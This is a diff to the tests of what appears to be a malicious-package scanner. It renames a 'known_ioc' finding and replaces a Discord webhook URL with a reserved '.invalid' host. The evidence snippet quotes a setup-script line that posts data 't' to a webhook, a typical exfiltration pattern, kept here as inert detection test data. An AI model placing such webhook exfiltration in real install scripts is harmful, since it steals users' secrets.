@@ -97,13 +97,13 @@ mod tests {
       {
         "code": "known_ioc",
         "severity": "high",
-        "title": "Discord webhook exfiltration endpoint",
-        "detail": "Code references a Discord webhook URL, a common destination for stolen data.",
+        "title": "Reserved webhook exfiltration endpoint",
+        "detail": "Code references a reserved webhook URL used as inert test evidence.",
         "evidence": [
           {
             "file": "scripts/setup.js",
             "line": 9,
-            "snippet": "post('https://discord.com/api/webhooks/...', t)"
+            "snippet": "post('https://webhook.invalid/api/webhooks/...', t)"
           }
         ]
       },
@@ -185,13 +185,13 @@ mod tests {
                 Reason {
                     code: ReasonCode::KnownIoc,
                     severity: Severity::High,
-                    title: "Discord webhook exfiltration endpoint".to_string(),
-                    detail: "Code references a Discord webhook URL, a common destination for stolen data."
+                    title: "Reserved webhook exfiltration endpoint".to_string(),
+                    detail: "Code references a reserved webhook URL used as inert test evidence."
                         .to_string(),
                     evidence: vec![Evidence {
                         file: "scripts/setup.js".to_string(),
                         line: 9,
-                        snippet: "post('https://discord.com/api/webhooks/...', t)".to_string(),
+                        snippet: "post('https://webhook.invalid/api/webhooks/...', t)".to_string(),
                     }],
                 },
                 Reason {
